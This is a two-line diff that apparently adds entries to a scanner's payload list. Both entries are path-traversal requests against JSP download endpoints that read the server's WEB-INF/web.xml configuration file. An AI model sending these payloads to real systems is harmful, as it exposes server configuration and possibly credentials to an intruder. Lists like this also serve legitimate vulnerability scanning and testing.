@@ -1,0 +1,2 @@
+/defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml
+/defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml
